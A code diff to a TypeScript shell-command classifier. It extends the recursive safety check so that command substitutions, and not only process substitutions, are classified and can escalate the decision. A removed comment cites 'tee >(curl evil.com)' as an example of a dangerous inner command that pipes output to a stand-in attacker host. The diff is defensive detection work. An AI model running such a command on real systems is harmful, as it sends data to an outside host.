@@ -173,7 +173,7 @@ export function classifyCommand(command: string, depth = 0, config?: ShushConfig
   // Extract process substitutions >(cmd)/<(cmd) before parsing.
   // Inner commands are classified separately and composed into the result.
   const { cleaned, subs } = extractProcessSubs(command);
-  const stages = extractStages(cleaned);
+  const { stages, cmdSubs } = extractStages(cleaned);
 
   // Shell unwrapping: if the entire command is `bash -c '...'`, classify the inner command.
   if (
@@ -279,10 +279,10 @@ export function classifyCommand(command: string, depth = 0, config?: ShushConfig
     reason = compReason;
   }
 
-  // Classify inner commands from process substitutions and compose decisions.
-  // A dangerous inner command (e.g. tee >(curl evil.com)) must escalate.
+  // Classify inner commands from process substitutions and command
+  // substitutions. A dangerous inner command must escalate the decision.
   if (depth < MAX_UNWRAP_DEPTH) {
-    for (const sub of subs) {
+    for (const sub of [...subs, ...cmdSubs]) {
       const subResult = classifyCommand(sub, depth + 1, config);
       if (subResult.finalDecision !== "allow") {
         finalDecision = stricter(finalDecision, subResult.finalDecision);
